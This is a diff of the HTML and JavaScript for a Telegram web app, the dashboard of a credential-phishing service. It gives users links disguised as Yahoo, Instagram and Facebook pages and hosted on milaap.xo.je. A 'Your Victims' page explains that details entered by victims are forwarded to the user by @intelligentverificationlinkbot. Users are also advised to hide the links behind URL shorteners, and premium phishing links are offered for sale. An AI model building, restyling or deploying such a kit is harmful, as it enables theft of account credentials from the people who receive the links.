@@ -1,445 +1,583 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Intelligent Linkbot - WebApp</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap');
+    /* ── Reset ─────────────────────────────── */
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
-    /* ── Reset ───────────────────────────────── */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    /* ── Variables ─────────────────────────── */
+    :root {
+      --bg:        #0d0f14;
+      --surface:   #161a22;
+      --surface2:  #1e2330;
+      --border:    rgba(255,255,255,0.08);
+      --border2:   rgba(255,255,255,0.14);
+      --accent:    #4f8cff;
+      --accent2:   #00e5a0;
+      --danger:    #ff5a5a;
+      --text:      #f0f2f7;
+      --text2:     #b0b8cc;
+      --text3:     #6e7a94;
+      --gold:      #ffc84a;
+      --radius:    12px;
+      --radius-sm: 8px;
+    }
 
-    /* ── Body ───────────────────────────────── */
+    /* ── Body ──────────────────────────────── */
     body, html {
-      font-family: 'Rajdhani', 'Segoe UI', sans-serif;
-      background: #09111a;
-      background-image:
-        radial-gradient(ellipse at 0% 0%, rgba(0,180,255,0.06) 0%, transparent 55%),
-        radial-gradient(ellipse at 100% 100%, rgba(0,255,153,0.04) 0%, transparent 50%);
-      color: #d0dde8;
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--text);
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-      padding-bottom: 60px;
+      padding-bottom: 68px;
+      font-size: 15px;
+      line-height: 1.6;
     }
 
-    /* ── Header ─────────────────────────────── */
+    /* ── Header ────────────────────────────── */
     header {
-      background: #0c1520;
-      padding: 12px 16px;
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 14px 20px;
       text-align: center;
-      font-family: 'Share Tech Mono', monospace;
-      font-weight: 500;
-      font-size: 1.4rem;
-      letter-spacing: 3px;
-      text-transform: uppercase;
-      color: #e0eaf5;
-      border-bottom: 1px solid rgba(0,180,255,0.25);
-      box-shadow: 0 2px 16px rgba(0,0,0,0.5);
-      position: relative;
+      position: sticky;
+      top: 0;
+      z-index: 100;
     }
-    /* subtle cyan underline glow */
-    header::after {
-      content: '';
-      position: absolute;
-      bottom: 0; left: 10%; right: 10%;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, #00b4ff88, transparent);
+    .header-title {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 1.15rem;
+      font-weight: 700;
+      color: var(--text);
+      letter-spacing: 0.5px;
+    }
+    .header-title span {
+      color: var(--accent);
     }
 
-    /* ── Main & Pages ───────────────────────── */
-    main { flex-grow: 1; overflow-y: auto; padding: 14px 16px; }
+    /* ── Main ──────────────────────────────── */
+    main {
+      flex: 1;
+      overflow-y: auto;
+      padding: 16px;
+    }
+
+    /* ── Pages ─────────────────────────────── */
     .page { display: none; max-width: 600px; margin: 0 auto; }
     .page.active { display: block; }
 
-    h2 {
-      color: #38c9ff;
-      margin-bottom: 14px;
+    /* ── Section Header ─────────────────────── */
+    .section-header {
+      margin-bottom: 16px;
       text-align: center;
+    }
+    .section-header h2 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 1.3rem;
       font-weight: 700;
-      font-family: 'Share Tech Mono', monospace;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      font-size: 1.1rem;
+      color: var(--text);
+      margin-bottom: 4px;
+    }
+    .section-header p {
+      font-size: 0.88rem;
+      color: var(--text3);
     }
 
-    p {
-      line-height: 1.55;
-      max-width: 600px;
-      margin: 0 auto 14px auto;
-      font-size: 1rem;
-      color: #9ab4c8;
+    /* ── Info Card ─────────────────────────── */
+    .info-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      font-size: 0.9rem;
+      color: var(--text2);
+      line-height: 1.65;
     }
+    .info-card strong, .info-card b { color: var(--text); font-weight: 600; }
+    .info-card a { color: var(--accent); text-decoration: none; font-weight: 600; }
+    .info-card a:hover { text-decoration: underline; }
 
-    /* ── Link List ──────────────────────────── */
-    ul.link-list { list-style: none; padding-left: 0; margin: 8px auto; max-width: 600px; }
-
-    ul.link-list li {
-      background: #0f1e2e;
-      margin: 10px 0;
-      border-radius: 8px;
+    /* ── Action Button Row ─────────────────── */
+    .action-row {
       display: flex;
-      align-items: center;
-      padding: 11px 14px;
-      cursor: pointer;
-      border: 1px solid rgba(0,180,255,0.15);
-      transition: border-color 0.25s, background 0.25s, box-shadow 0.25s;
+      gap: 10px;
+      margin-bottom: 14px;
     }
-    ul.link-list li:hover {
-      background: #132333;
-      border-color: rgba(0,180,255,0.45);
-      box-shadow: 0 0 14px rgba(0,180,255,0.12);
+    .action-row .btn-primary,
+    .action-row .btn-secondary {
+      flex: 1;
+      text-align: center;
     }
 
-    ul.link-list li img {
-      height: 44px; width: 44px;
-      object-fit: contain;
-      margin-right: 13px;
-      border-radius: 6px;
-      flex-shrink: 0;
-      border: 1px solid rgba(0,180,255,0.3);
-      background: #0a131d;
-    }
-    ul.link-list li a {
-      color: #c8dae8;
-      text-decoration: none;
-      font-weight: 600;
-      font-size: 1rem;
-      flex-grow: 1;
-    }
-
-    /* ── Buttons ────────────────────────────── */
-    .btn {
-      background: #0f2236;
-      color: #38c9ff;
-      padding: 5px 13px;
+    /* ── Buttons ───────────────────────────── */
+    .btn-primary {
+      display: inline-block;
+      background: var(--accent);
+      color: #fff;
+      font-size: 0.88rem;
       font-weight: 700;
-      font-family: 'Share Tech Mono', monospace;
-      font-size: 0.78rem;
-      letter-spacing: 0.8px;
-      border: 1px solid rgba(56,201,255,0.5);
-      border-radius: 5px;
+      padding: 11px 18px;
+      border-radius: var(--radius-sm);
+      border: none;
       cursor: pointer;
-      transition: background 0.2s, box-shadow 0.2s, color 0.2s;
+      transition: opacity 0.18s, transform 0.15s;
+      text-decoration: none;
+      letter-spacing: 0.2px;
       white-space: nowrap;
     }
-    .btn:hover {
-      background: #38c9ff;
-      color: #050f18;
-      box-shadow: 0 0 10px rgba(56,201,255,0.45);
-    }
-    .btn2 {
-      background: #0f2236;
-      color: #38c9ff;
-      padding: 5px 11px;
+    .btn-primary:hover { opacity: 0.88; transform: translateY(-1px); }
+    .btn-primary:active { transform: scale(0.97); }
+
+    .btn-secondary {
+      display: inline-block;
+      background: var(--surface2);
+      color: var(--text);
+      font-size: 0.88rem;
       font-weight: 600;
-      font-family: 'Share Tech Mono', monospace;
-      font-size: 0.78rem;
-      border: 1px solid rgba(56,201,255,0.4);
-      border-radius: 5px;
+      padding: 11px 18px;
+      border-radius: var(--radius-sm);
+      border: 1px solid var(--border2);
       cursor: pointer;
-      transition: background 0.2s, color 0.2s;
+      transition: background 0.18s, transform 0.15s;
+      text-decoration: none;
+      white-space: nowrap;
     }
-    .btn2:hover { background: #38c9ff; color: #050f18; }
-    .btn.disabled { border-color: #2a3a4a; color: #3a5060; cursor: not-allowed; background: #0a1520; }
+    .btn-secondary:hover { background: #252b3a; transform: translateY(-1px); }
 
-    /* ── Donation ───────────────────────────── */
-    .donation-info {
-      max-width: 600px;
-      margin: 0 auto;
-      background: #0f1e2e;
-      padding: 20px;
-      border-radius: 10px;
-      border: 1px solid rgba(0,180,255,0.2);
-      line-height: 1.6;
-      font-size: 1rem;
-      text-align: center;
+    /* small btn used in link rows */
+    .btn {
+      background: var(--surface2);
+      color: var(--text);
+      font-size: 0.8rem;
+      font-weight: 600;
+      padding: 7px 13px;
+      border-radius: var(--radius-sm);
+      border: 1px solid var(--border2);
+      cursor: pointer;
+      transition: background 0.15s, color 0.15s;
+      white-space: nowrap;
     }
-    .donation-info strong { color: #38c9ff; }
-
-    .crypto-address {
-      font-family: 'Share Tech Mono', monospace;
-      font-size: 0.82rem;
-      background: #07111c;
-      color: #38c9ff;
-      padding: 11px;
-      border-radius: 6px;
-      border: 1px dashed rgba(56,201,255,0.3);
-      margin-top: 10px;
-      user-select: all;
-      word-break: break-all;
-      letter-spacing: 0.5px;
+    .btn:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+    .btn2 {
+      background: var(--surface2);
+      color: var(--text2);
+      font-size: 0.8rem;
+      font-weight: 600;
+      padding: 7px 11px;
+      border-radius: var(--radius-sm);
+      border: 1px solid var(--border);
+      cursor: pointer;
+      transition: background 0.15s;
     }
+    .btn2:hover { background: #252b3a; }
+    .btn.disabled { opacity: 0.3; cursor: not-allowed; }
 
-    /* ── Bottom Nav ─────────────────────────── */
-    .bottom-nav {
-      position: fixed; bottom: 0; left: 0; right: 0;
-      height: 58px;
-      background: #07111c;
-      border-top: 1px solid rgba(0,180,255,0.2);
+    /* ── Link List ─────────────────────────── */
+    ul.link-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
       display: flex;
-      justify-content: space-around;
+      flex-direction: column;
+      gap: 10px;
+    }
+    ul.link-list li {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      display: flex;
       align-items: center;
-      box-shadow: 0 -4px 16px rgba(0,0,0,0.5);
+      padding: 12px 14px;
+      gap: 12px;
+      transition: border-color 0.2s, background 0.2s;
+    }
+    ul.link-list li:hover {
+      border-color: var(--border2);
+      background: var(--surface2);
+    }
+    ul.link-list li img {
+      width: 42px;
+      height: 42px;
+      border-radius: 10px;
+      object-fit: contain;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+    ul.link-list li .link-name {
+      flex: 1;
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+    ul.link-list li .btn-group {
+      display: flex;
+      gap: 6px;
+      flex-shrink: 0;
+    }
+
+    /* ── Custom Link Button ─────────────────── */
+    .custom-link-btn {
+      max-width: 600px;
+      margin: 0 auto 14px auto;
+    }
+    .custom-link-btn a {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      background: var(--surface);
+      border: 1px solid var(--border2);
+      border-radius: var(--radius);
+      padding: 13px;
+      color: var(--text);
+      font-weight: 700;
+      font-size: 0.9rem;
+      text-decoration: none;
+      transition: background 0.2s, border-color 0.2s;
+    }
+    .custom-link-btn a:hover {
+      background: var(--surface2);
+      border-color: var(--accent);
+      color: var(--accent);
+    }
+
+    /* ── Donation ──────────────────────────── */
+    .donation-info {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 20px;
+      text-align: center;
+      color: var(--text2);
+      font-size: 0.95rem;
+      line-height: 1.7;
+    }
+    .donation-info strong { color: var(--text); }
+    .crypto-address {
+      font-family: 'Space Grotesk', monospace;
+      font-size: 0.82rem;
+      background: var(--bg);
+      color: var(--accent2);
+      border: 1px dashed rgba(0,229,160,0.3);
+      border-radius: var(--radius-sm);
+      padding: 12px;
+      margin-top: 12px;
+      word-break: break-all;
+      user-select: all;
+      letter-spacing: 0.4px;
+    }
+
+    /* ── Bottom Nav ────────────────────────── */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      height: 64px;
+      background: var(--surface);
+      border-top: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      padding: 0 4px;
+      z-index: 200;
     }
     .bottom-nav button {
       background: none;
       border: none;
-      color: #3d5a72;
-      font-size: 1.1rem;
+      color: var(--text3);
+      font-size: 1.25rem;
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: center;
       cursor: pointer;
       transition: color 0.2s;
-      width: 44px;
+      flex: 1;
+      padding: 6px 2px;
+      min-width: 0;
     }
     .bottom-nav button span {
-      font-size: 0.55rem;
-      margin-top: 2px;
+      font-size: 0.56rem;
+      margin-top: 3px;
       font-weight: 600;
-      font-family: 'Share Tech Mono', monospace;
       letter-spacing: 0.3px;
       text-transform: uppercase;
+      font-family: 'Inter', sans-serif;
     }
-    .bottom-nav button.active { color: #38c9ff; }
-    .bottom-nav a { text-decoration: none; }
-    .bottom-nav a button { color: #3d5a72; }
-    .bottom-nav a button:hover { color: #38c9ff; }
-
-    /* ── Responsive ─────────────────────────── */
-    @media (max-width: 400px) {
-      ul.link-list li { flex-direction: column; align-items: flex-start; }
-      ul.link-list li img { margin-bottom: 8px; margin-right: 0; }
+    .bottom-nav button.active {
+      color: var(--accent);
     }
+    .bottom-nav a {
+      flex: 1;
+      text-decoration: none;
+      display: flex;
+    }
+    .bottom-nav a button {
+      color: var(--text3);
+      flex: 1;
+    }
+    .bottom-nav a button:hover { color: var(--accent); }
 
-    /* ═══ PREMIUM MODAL ═════════════════════ */
+    /* ── Victim Page ───────────────────────── */
+    .victim-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px 20px;
+      text-align: center;
+    }
+    .victim-card .icon {
+      font-size: 2.5rem;
+      margin-bottom: 12px;
+    }
+    .victim-card h3 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 10px;
+    }
+    .victim-card p {
+      font-size: 0.92rem;
+      color: var(--text2);
+      margin-bottom: 14px;
+      line-height: 1.65;
+    }
+    .victim-card p strong { color: var(--accent); font-weight: 700; }
+    #openBotBtnVictim {
+      background: var(--accent);
+      color: #fff;
+      font-size: 0.9rem;
+      font-weight: 700;
+      padding: 12px 24px;
+      border-radius: var(--radius-sm);
+      border: none;
+      cursor: pointer;
+      width: 100%;
+      transition: opacity 0.18s;
+    }
+    #openBotBtnVictim:hover { opacity: 0.85; }
+
+    /* ── PREMIUM MODAL ─────────────────────── */
     .premium-modal {
       position: fixed;
       inset: 0;
-      background: rgba(0,0,0,0.82);
+      background: rgba(0,0,0,0.78);
       display: none;
       align-items: center;
       justify-content: center;
       z-index: 9999;
-      backdrop-filter: blur(3px);
+      backdrop-filter: blur(4px);
+      padding: 16px;
     }
-
     .premium-box {
-      background: #0c1b2a;
-      border: 1px solid rgba(56,201,255,0.3);
-      border-radius: 12px;
-      padding: 22px 20px;
-      width: 90%;
+      background: var(--surface);
+      border: 1px solid var(--border2);
+      border-radius: 16px;
+      padding: 24px 20px;
+      width: 100%;
       max-width: 360px;
       text-align: center;
-      box-shadow: 0 8px 40px rgba(0,0,0,0.7), 0 0 30px rgba(56,201,255,0.08);
-      animation: scaleIn .25s ease;
+      animation: popIn 0.22s ease;
     }
-
+    @keyframes popIn {
+      from { transform: scale(0.88); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
     .premium-box h3 {
-      color: #38c9ff;
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--text);
       margin-bottom: 10px;
-      font-family: 'Share Tech Mono', monospace;
-      letter-spacing: 2px;
-      font-size: 1rem;
-      text-transform: uppercase;
     }
-
     .premium-box p {
-      font-size: .92rem;
-      color: #8aaec5;
-      margin-bottom: 14px;
-      line-height: 1.5;
+      font-size: 0.88rem;
+      color: var(--text2);
+      line-height: 1.6;
+      margin-bottom: 12px;
     }
+    .premium-box p a { color: var(--accent); font-weight: 600; text-decoration: none; }
+    .premium-box p b { color: var(--text); }
 
-    /* Shared modal button base */
     .premium-buy-btn,
     .premium-ok-btn,
     .whatsapp-ok-btn,
     .premium-later-btn {
       width: 100%;
-      padding: 11px;
+      padding: 12px;
       border: none;
       font-weight: 700;
-      font-family: 'Share Tech Mono', monospace;
-      font-size: 0.82rem;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-      margin-bottom: 9px;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.88rem;
+      letter-spacing: 0.2px;
+      margin-bottom: 8px;
       cursor: pointer;
-      border-radius: 5px;
-      transition: filter 0.2s, box-shadow 0.2s;
+      border-radius: var(--radius-sm);
+      transition: opacity 0.18s, transform 0.15s;
     }
-
-    .premium-buy-btn {
-      background: linear-gradient(90deg, #00b96a, #00e887);
-      color: #050f18;
-      box-shadow: 0 0 10px rgba(0,232,135,0.25);
-    }
-    .premium-buy-btn:hover { filter: brightness(1.12); box-shadow: 0 0 18px rgba(0,232,135,0.45); }
-
-    .premium-ok-btn {
-      background: linear-gradient(90deg, #1263cc, #1f8cff);
-      color: #fff;
-      box-shadow: 0 0 10px rgba(31,140,255,0.2);
-    }
-    .premium-ok-btn:hover { filter: brightness(1.12); box-shadow: 0 0 18px rgba(31,140,255,0.4); }
-
-    .whatsapp-ok-btn {
-      background: linear-gradient(90deg, #1a6e2e, #25d366);
-      color: #fff;
-      box-shadow: 0 0 10px rgba(37,211,102,0.2);
-    }
-    .whatsapp-ok-btn:hover { filter: brightness(1.12); box-shadow: 0 0 18px rgba(37,211,102,0.4); }
-
+    .premium-buy-btn { background: var(--accent2); color: #0a1a14; }
+    .premium-ok-btn { background: var(--accent); color: #fff; }
+    .whatsapp-ok-btn { background: #25d366; color: #fff; }
     .premium-later-btn {
-      background: rgba(255,255,255,0.05);
-      color: #7a9db8;
-      border: 1px solid rgba(255,255,255,0.1);
-      margin-bottom: 4px;
+      background: var(--surface2);
+      color: var(--text2);
+      border: 1px solid var(--border2);
+      margin-bottom: 0;
     }
-    .premium-later-btn:hover { background: rgba(255,255,255,0.1); color: #c0d8ea; }
+    .premium-buy-btn:hover,
+    .premium-ok-btn:hover,
+    .whatsapp-ok-btn:hover { opacity: 0.88; transform: translateY(-1px); }
+    .premium-later-btn:hover { background: #252b3a; color: var(--text); }
 
-    @keyframes scaleIn {
-      from { transform: scale(.85); opacity: 0; }
-      to   { transform: scale(1);   opacity: 1; }
+    /* ── Responsive ────────────────────────── */
+    @media (max-width: 400px) {
+      ul.link-list li { flex-wrap: wrap; }
+      ul.link-list li .link-name { width: 100%; }
     }
   </style>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-  <header>Intelligent Dashboard</header>
+
+  <header>
+    <div class="header-title">⚡ Intelligent <span>Dashboard</span></div>
+  </header>
 
   <main>
-    <!-- Home Section -->
+
+    <!-- ── HOME ── -->
     <section id="home" class="page active">
-<p>
-  <b>
-    Click on the "open" button to test your link before you send it to your clients, 
-    and also remember to shorten it in any link shorten website like 
-    <a href="https://theurlshortener.me/" target="_blank" onclick="openWithAd('https://theurlshortener.me/')" style="color:pink;">bitly</a> 
-    or 
-    <a href="https://theurlshortener.me/" target="_blank" onclick="openWithAd('https://theurlshortener.me/')" style="color:pink;">tinyurl</a> 
-    when you copy the link
-  </b>
-</p>
 
-<script>
-  function openWithAd(url) {
-    try {
-      if (typeof show_9830644 === "function") {
-        show_9830644(); // show Monetag ad
-        setTimeout(function() {
-          window.open(url, "_blank", "noopener"); // always open in new tab
-        }, 10000); // wait 10s before redirect (adjust if needed)
-      } else {
-        window.open(url, "_blank", "noopener");
-      }
-    } catch(e) {
-      window.open(url, "_blank", "noopener");
-    }
-  }
-</script>
-<button id="openBotBtnHome" class="btn">Generate your own custom link here.</button>
-<!-- 🔗 Custom Link Button (Free Section) -->
-<style>
-  .custom-link-btn {
-    max-width: 600px;
-    margin: 10px auto 15px auto;
-  }
+      <div class="info-card">
+        <b>How to use:</b> Click <b>"Open"</b> to test your link before sending to clients.
+        Remember to shorten your link using
+        <a href="https://theurlshortener.me/" target="_blank" onclick="openWithAd('https://theurlshortener.me/')">bitly</a>
+        or
+        <a href="https://theurlshortener.me/" target="_blank" onclick="openWithAd('https://theurlshortener.me/')">tinyurl</a>
+        after copying.
+      </div>
 
-  .custom-link-btn a {
-    display: block;
-    background: #0f2236;
-    padding: 11px;
-    border-radius: 6px;
-    border: 1px solid rgba(56,201,255,0.45);
-    text-align: center;
-    font-weight: 700;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.92rem;
-    letter-spacing: 1px;
-    color: #38c9ff;
-    text-decoration: none;
-    text-transform: uppercase;
-    transition: background 0.2s, box-shadow 0.2s;
-  }
+      <script>
+        function openWithAd(url) {
+          try {
+            if (typeof show_9830644 === "function") {
+              show_9830644();
+              setTimeout(function() {
+                window.open(url, "_blank", "noopener");
+              }, 10000);
+            } else {
+              window.open(url, "_blank", "noopener");
+            }
+          } catch(e) {
+            window.open(url, "_blank", "noopener");
+          }
+        }
+      </script>
 
-  .custom-link-btn a:hover {
-    background: #38c9ff;
-    color: #050f18;
-    box-shadow: 0 0 12px rgba(56,201,255,0.4);
-  }
-</style>
+      <div class="action-row">
+        <button id="openBotBtnHome" class="btn-primary">⚙️ Generate Custom Link</button>
+      </div>
 
-<div class="custom-link-btn">
-  <a href="http://t.me/intelligentverificationlinkbot/customlink" target="_blank">
-    🔗 Custom Link
-  </a>
-</div>
-<ul id="freeLinksList" class="link-list"></ul>
+      <div class="custom-link-btn">
+        <a href="http://t.me/intelligentverificationlinkbot/customlink" target="_blank">
+          🔗 Custom Link
+        </a>
+      </div>
+
+      <ul id="freeLinksList" class="link-list"></ul>
     </section>
-    <!-- Premium Section -->
+
+    <!-- ── PREMIUM ── -->
     <section id="premium" class="page">
-      <h2>Premium Links</h2>
+      <div class="section-header">
+        <h2>🔒 Premium Links</h2>
+        <p>Exclusive links for premium members</p>
+      </div>
       <div id="premiumContent"></div>
-      <p style="text-align:center; font-size:0.9rem; margin-top:20px; color:#aaa;">
-        Not a premium user? <br />
-        Message us to get premium access:<br />
-        <a href="https://t.me/intelpremiumbot" target="_blank" style="color:#00ff99; font-weight:700;">@intelpremiumbot</a>
+      <p style="text-align:center; font-size:0.88rem; margin-top:20px; color:var(--text3);">
+        Not a premium user?<br/>
+        <a href="https://t.me/intelpremiumbot" target="_blank" style="color:var(--accent2); font-weight:700;">@intelpremiumbot</a>
       </p>
     </section>
 
-    <!-- Victim Section -->
-    <section id="victim" class="page" style="text-align:center;">
-      <h2>Your Victims</h2>
-      <p>If you copy a link and your Victim clicks on the link and drops their details, <strong style="color:#38c9ff;">@intelligentverificationlinkbot</strong> will send you the details. Your Victim's details are between you and your Victim — this bot doesn't know anything about it.</p>
-      <p style="margin-top:10px;">Then start <strong style="color:#38c9ff;">@intelligentverificationlinkbot</strong> by clicking the button below.</p>
-      <button id="openBotBtnVictim" class="btn">👉 Start @intelligentverificationlinkbot</button>
+    <!-- ── VICTIM ── -->
+    <section id="victim" class="page">
+      <div class="victim-card">
+        <div class="icon">👁️</div>
+        <h3>Your Victims</h3>
+        <p>
+          If you copy a link and your Victim clicks on it and drops their details,
+          <strong>@intelligentverificationlinkbot</strong> will send you the details instantly.
+        </p>
+        <p>
+          Your Victim's details are between you and your Victim —
+          this bot doesn't know anything about it.
+        </p>
+        <p>
+          Then start <strong>@intelligentverificationlinkbot</strong> by clicking the button below.
+        </p>
+        <button id="openBotBtnVictim">👉 Start @intelligentverificationlinkbot</button>
+      </div>
     </section>
 
-    <!-- Donate Section -->
+    <!-- ── DONATE ── -->
     <section id="donate" class="page">
-      <h2>Support Our Project</h2>
+      <div class="section-header">
+        <h2>💰 Support Our Project</h2>
+        <p>Your support keeps this running</p>
+      </div>
       <div class="donation-info" id="donationInfo"></div>
     </section>
+
   </main>
-<nav class="bottom-nav">
-  <button onclick="showMyAd(); switchPage('home')" id="navHome" class="active">🏠<span>Home</span></button>
-  <button onclick="switchPage('premium')" id="navPremium">🔒<span>Premium</span></button>
-  <button onclick="showMyAd(); switchPage('victim')" id="navVictim">👁️<span>Victim</span></button>
-  <button onclick="switchPage('donate')" id="navDonate">💰<span>Donate</span></button>
-  <a href="https://t.me/intelligentpublicgroupsbot/explore" target="_blank">
-    <button id="navGroups">👥<span>Groups</span></button>
-  </a>
-  <a href="http://t.me/intelpremiumbot/premiumdash" target="_blank">
-    <button id="navEarning">💵<span>Earning</span></button>
-  </a>
-  <a href="https://t.me/intelligentverificationlinkbot/about" target="_blank">
-    <button id="navHelp">❓<span>Help</span></button>
-  </a>
-</nav>
-    <script src="//libtl.com/sdk.js" data-zone="9830644" data-sdk="show_9830644"></script>
+
+  <!-- ── BOTTOM NAV ── -->
+  <nav class="bottom-nav">
+    <button onclick="showMyAd(); switchPage('home')" id="navHome" class="active">🏠<span>Home</span></button>
+    <button onclick="switchPage('premium')" id="navPremium">🔒<span>Premium</span></button>
+    <button onclick="showMyAd(); switchPage('victim')" id="navVictim">👁️<span>Victim</span></button>
+    <button onclick="switchPage('donate')" id="navDonate">💰<span>Donate</span></button>
+    <a href="https://t.me/intelligentpublicgroupsbot/explore" target="_blank">
+      <button id="navGroups">👥<span>Groups</span></button>
+    </a>
+    <a href="http://t.me/intelpremiumbot/premiumdash" target="_blank">
+      <button id="navEarning">💵<span>Earning</span></button>
+    </a>
+    <a href="https://t.me/intelligentverificationlinkbot/about" target="_blank">
+      <button id="navHelp">❓<span>Help</span></button>
+    </a>
+  </nav>
+
+  <!-- ── AD SDK ── -->
+  <script src="//libtl.com/sdk.js" data-zone="9830644" data-sdk="show_9830644"></script>
 
   <script>
     function showMyAd() {
-  try {
-    show_9830644()
-      .then(() => {
-        console.log("✅ Ad watched!");
-      })
-      .catch(() => {
-        console.log("⚠️ Ad failed or skipped.");
-      });
-  } catch (e) {
-    console.error("Ad function not loaded yet", e);
-  }
-}
+      try {
+        return show_9830644()
+          .then(() => { console.log("✅ Ad watched!"); })
+          .catch(() => {
+            console.log("⚠️ Ad failed or skipped.");
+            throw new Error("Ad failed");
+          });
+      } catch (e) {
+        console.error("Ad function not loaded yet", e);
+        return Promise.reject(e);
+      }
+    }
   </script>
+
   <script src="premiumlist.js"></script>
-    <script src="premium.js"></script>
+  <script src="premium.js"></script>
+
   <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
@@ -448,174 +586,156 @@
 
     const freeLinksList = document.getElementById('freeLinksList');
     const premiumContent = document.getElementById('premiumContent');
+    const donationInfo   = document.getElementById('donationInfo');
 
-function addEditCryptoButton() {
-  const btnWrapper = document.createElement("div");
-  btnWrapper.style.maxWidth = "600px";
-  btnWrapper.style.margin = "0 auto 15px auto";
+    // ── Add Edit Crypto Button for premium users ──
+    function addEditCryptoButton() {
+      const btnWrapper = document.createElement("div");
+      btnWrapper.style.cssText = "max-width:600px;margin:0 auto 14px auto;";
+      btnWrapper.innerHTML = `
+        <a href="https://t.me/intelligentverificationlinkbot/premiumedit" target="_blank" style="text-decoration:none;">
+          <div style="background:var(--accent);color:#fff;padding:13px;border-radius:10px;text-align:center;font-weight:700;font-size:0.95rem;">
+            ✏️ Edit Crypto Link
+          </div>
+        </a>`;
+      premiumContent.parentNode.insertBefore(btnWrapper, premiumContent);
+    }
+    if (typeof premiumUsers !== "undefined" && premiumUsers && premiumUsers.includes(telegramId)) {
+      addEditCryptoButton();
+    }
 
-  btnWrapper.innerHTML = `
-    <a href="https://t.me/intelligentverificationlinkbot/premiumedit" target="_blank" style="text-decoration:none;">
-      <div style="
-        background:#1f8cff;
-        padding:14px;
-        border-radius:12px;
-        text-align:center;
-        font-weight:700;
-        font-size:1.05rem;
-        color:#fff;
-      ">
-        ✏️ Edit Crypto Link
-      </div>
-    </a>
-  `;
-
-  premiumContent.parentNode.insertBefore(btnWrapper, premiumContent);
-}
-
-// ✅ CALL IT HERE
-if (premiumUsers && premiumUsers.includes(telegramId)) {
-  addEditCryptoButton();
-}
-    const donationInfo = document.getElementById('donationInfo');
-
+    // ── Nav ──
     const navButtons = {
-      home: document.getElementById('navHome'),
+      home:    document.getElementById('navHome'),
       premium: document.getElementById('navPremium'),
-      victim: document.getElementById('navVictim'),
-      donate: document.getElementById('navDonate')
+      victim:  document.getElementById('navVictim'),
+      donate:  document.getElementById('navDonate')
     };
     const pages = {
-      home: document.getElementById('home'),
+      home:    document.getElementById('home'),
       premium: document.getElementById('premium'),
-      victim: document.getElementById('victim'),
-      donate: document.getElementById('donate')
+      victim:  document.getElementById('victim'),
+      donate:  document.getElementById('donate')
     };
 
+    function switchPage(pageKey) {
+      Object.keys(pages).forEach(key => {
+        pages[key].classList.toggle("active", key === pageKey);
+        if (navButtons[key]) navButtons[key].classList.toggle("active", key === pageKey);
+      });
+    }
+    Object.entries(navButtons).forEach(([key, btn]) => {
+      btn.addEventListener("click", () => switchPage(key));
+    });
+
+    // ── Free Links ──
     const freeLinks = [
-      // all new link i just added 
-{ name: "Yahoo Login", image: "https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage.png", urlTemplate: "https://milaap.xo.je/sh/y.html?id={telegram-id}" },
-{ name: "Instagram", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10", urlTemplate: "https://milaap.xo.je/sh/i.html?id={telegram-id}" },
-{ name: "Facebook xxx vid", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10", urlTemplate: "https://milaap.xo.je/sh/pf/pf.html?id={telegram-id}" },
+      { name: "Yahoo Login",       image: "https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage.png", urlTemplate: "https://milaap.xo.je/sh/y.html?id={telegram-id}" },
+      { name: "Instagram",         image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10", urlTemplate: "https://milaap.xo.je/sh/i.html?id={telegram-id}" },
